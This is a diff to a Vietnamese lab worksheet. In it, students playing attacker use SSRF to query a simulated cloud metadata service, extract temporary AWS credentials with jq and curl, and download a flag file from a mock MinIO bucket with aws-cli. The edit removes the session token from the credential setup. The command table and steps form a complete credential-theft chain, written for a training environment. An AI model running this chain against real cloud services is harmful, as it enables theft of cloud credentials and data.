@@ -122,7 +122,7 @@ Sinh viên đóng vai **attacker** đã tiếp cận được giao diện ứng 
 | `curl` | `curl -s "http://web:8080/fetch?url=http://imds/latest/meta-data/"` | Ép server đi qua SSRF để truy vấn IMDS giả (khai thác chính). |
 | `curl \| jq` | `curl -s ... \| jq .` | Kết hợp với `jq` để định dạng/parse phản hồi JSON credential. |
 | `jq` | `jq -r '.AccessKeyId, .SecretAccessKey, .Token'` | Trích riêng từng trường credential từ JSON để cấu hình aws-cli. |
-| `export` | `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...` | Nạp credential tạm thời (kèm session token) qua biến môi trường cho aws-cli. |
+| `export` | `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=...` | Nạp credential tạm thời qua biến môi trường cho aws-cli. |
 | `aws-cli` | `aws --endpoint-url http://storage:9000 s3 ls` | Liệt kê bucket trên object storage mô phỏng (MinIO). |
 | `aws-cli` | `aws --endpoint-url http://storage:9000 s3 cp s3://fin-reports/flag.txt ./flag.txt` | Tải đối tượng `flag.txt` từ bucket về máy. |
 | `curl -X POST` | `curl -s -X POST http://imds/admin/enable-imdsv2` | (Nhiệm vụ 4) Bật chế độ IMDSv2 trên dịch vụ metadata giả. |
@@ -223,11 +223,11 @@ Trả lời: _______________________________________
 
 **Mục tiêu:** Cấu hình `aws-cli` bằng credential tạm thời vừa lấy, trỏ tới object storage mô phỏng (MinIO), liệt kê bucket và tải về `flag.txt`.
 
-**Bước 1:** Nạp credential (bao gồm cả session token) qua biến môi trường (lấy giá trị từ `~/creds.txt`):
+**Bước 1:** Nạp credential qua biến môi trường (lấy giá trị từ `~/creds.txt`). Object storage mô phỏng (MinIO) chỉ cần cặp AccessKeyId/SecretAccessKey; trường `Token` của IMDS là giá trị mô phỏng, **không** nạp vào `AWS_SESSION_TOKEN` (MinIO sẽ từ chối yêu cầu mang token không hợp lệ):
 ```bash
 export AWS_ACCESS_KEY_ID=<AccessKeyId>
 export AWS_SECRET_ACCESS_KEY=<SecretAccessKey>
-export AWS_SESSION_TOKEN=<Token>
+unset AWS_SESSION_TOKEN
 export AWS_DEFAULT_REGION=us-east-1
 ```
 
